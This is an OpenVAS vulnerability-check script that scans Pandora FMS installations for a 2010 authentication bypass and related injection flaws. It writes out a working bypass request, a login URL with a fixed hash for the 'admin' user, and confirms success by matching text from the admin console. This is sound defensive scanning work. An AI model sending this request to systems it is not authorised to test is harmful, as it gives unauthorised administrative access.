###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_pandora_fms_45112.nasl 8440 2018-01-17 07:58:46Z teissa $
#
# Pandora FMS Authentication Bypass And Multiple Input Validation Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Pandora FMS is prone to an authentication-bypass vulnerability as well
as the following input-validation vulnerabilities:

1. A command-injection vulnerability
2. Multiple SQL-injection vulnerabilities
3. A remote file-include vulnerability
4. An arbitrary PHP-code-execution vulnerability
5. Multiple local file-include vulnerabilities

Attackers may exploit these issues to execute local and remote script
code in the context of the affected application, compromise the
application, obtain sensitive information, access or modify data,
exploit latent vulnerabilities in the underlying database, and gain
administrative access to the affected application.

Versions prior and including Pandora FMS 3.1 are vulnerable.";

tag_solution = "Updates are available. Please see the reference for more details.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100927");
 script_version("$Revision: 8440 $");
 script_tag(name:"last_modification", value:"$Date: 2018-01-17 08:58:46 +0100 (Wed, 17 Jan 2018) $");
 script_tag(name:"creation_date", value:"2010-12-01 14:30:53 +0100 (Wed, 01 Dec 2010)");
 script_bugtraq_id(45112);
 script_cve_id("CVE-2010-4278","CVE-2010-4279","CVE-2010-4280","CVE-2010-4281","CVE-2010-4282","CVE-2010-4283");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

 script_name("Pandora FMS Authentication Bypass And Multiple Input Validation Vulnerabilities");


 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("gb_pandora_fms_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/45112");
 script_xref(name : "URL" , value : "http://pandorafms.org/index.php?sec=project&sec2=home&lng=en");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/514939");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port, app:"pandora_fms"))exit(0);
url = string(dir, "/index.php?loginhash_data=21232f297a57a5a743894a0e4a801fc3&loginhash_user=admin&loginhash=1"); 

if(http_vuln_check(port:port, url:url,pattern:"This is your last activity in Pandora FMS console",extra_check:make_list(":: Administration ::",":: Operation ::"))) {
     
  security_message(port:port);
  exit(0);

}

exit(0);

